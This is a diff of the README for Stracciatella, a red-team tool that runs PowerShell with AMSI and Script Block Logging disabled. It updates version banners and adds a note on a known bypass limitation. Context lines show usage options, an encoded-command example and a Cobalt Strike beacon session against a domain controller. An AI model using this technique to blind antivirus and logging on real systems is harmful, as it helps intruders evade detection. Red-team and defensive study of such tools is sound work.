@@ -1,4 +1,4 @@
-# Stracciatella v0.4
+# Stracciatella v0.5
 
 Powershell runspace from within C# (aka `SharpPick` technique) with AMSI and Script Block Logging disabled for your pleasure.
 
@@ -49,11 +49,11 @@ Best mileage one gets with Stracciatella compiled with .NET 3.5.
 There are couple of options available:
 
 ```
-v:\vmshared\__RED_TEAM_TOOLS\Stracciatella>Stracciatella -h
+PS D:\> Stracciatella -h
 
   :: Stracciatella - Powershell runspace with AMSI and Script Block Logging disabled.
-  Mariusz B. / mgeeky, '19-20 <mb@binary-offensive.com>
-  v0.3
+  Mariusz B. / mgeeky, '19-21 <mb@binary-offensive.com>
+  v0.5
 
 Usage: stracciatella.exe [options] [command]
   -s <path>, --script <path> - Path to file containing Powershell script to execute. If not options given, will enter
@@ -76,7 +76,6 @@ Usage: stracciatella.exe [options] [command]
   -e, --cmdalsoencoded       - Consider input command (specified in '--command') encoded as well.
                                Decodes input command after decoding and running input script file.
                                By default we only decode input file and consider command given in plaintext
-
 ```
 
 The program accepts command and script file path as it's input. Both are optional, if none were given - pseudo-shell will be started.
@@ -90,7 +89,8 @@ Here are couple of examples presenting use cases:
 PS D:\> Stracciatella.exe -v
 
   :: Stracciatella - Powershell runspace with AMSI and Script Block Logging disabled.
-  Mariusz B. / mgeeky, '19 <mb@binary-offensive.com>
+  Mariusz B. / mgeeky, '19-21 <mb@binary-offensive.com>
+  v0.5
 
 [.] Powershell's version: 5.1
 [.] Language Mode: FullLanguage
@@ -139,7 +139,8 @@ Then we feed `encoder.py` output as input being an encoded command for Stracciat
 PS D:\> Stracciatella.exe -v -x 0x31 -c "ZkNYRVQceV5CRRETeEURRl5DWkIRXVhaVBFQEVJZUENcEBMRChEVdElUUkRFWF5fcl5fRVRJRR9iVEJCWF5fYkVQRVQffVBfVkRQVlR8XlVU" .\Test2.ps1
 
   :: Stracciatella - Powershell runspace with AMSI and Script Block Logging disabled.
-  Mariusz B. / mgeeky, '19 <mb@binary-offensive.com>
+  Mariusz B. / mgeeky, '19-21 <mb@binary-offensive.com>
+  v0.5
 
 [.] Will load script file: '.\Test2.ps1'
 [+] AMSI Disabled.
@@ -214,6 +215,7 @@ This can be remediated however by adjusting Straciatella's timeout parameter usi
 
 ```
 beacon> stracciatella-timeout 600000
+
 beacon> stracciatella Resolve-IPAddress dc1.bank.corp
 [*] Tasked Beacon to run Stracciatella: Resolve-IPAddress dc1.bank.corp
 [+] [11/02 04:01:11] host called home, sent: 1007265 bytes
@@ -262,7 +264,8 @@ This script contains malicious content and has been blocked by your antivirus so
 PS D:\> .\Stracciatella.exe -v
 
   :: Stracciatella - Powershell runspace with AMSI and Script Block Logging disabled.
-  Mariusz B. / mgeeky, '19 <mb@binary-offensive.com>
+  Mariusz B. / mgeeky, '19-21 <mb@binary-offensive.com>
+  v0.5
 
 [-] It looks like no script path was given.
 [+] AMSI Disabled.
@@ -302,7 +305,7 @@ Currently, the way the Stracciatella provides runspace for powershell commands i
 - Implement more encoding/encryption strategies, especially ones utilising environmental keying
 - Add Tab-autocompletion and support for Up/Down arrows (having provided that plaintext commands are not going to be stored in Straciatella's memory)
 - Add coloured outputs
-
+- Script Block Logging bypass _may not be effective_ against Windows Server 2016 and Windows 10 as reported [here](https://github.com/mgeeky/Stracciatella/issues/4)
 
 ## Credits
 
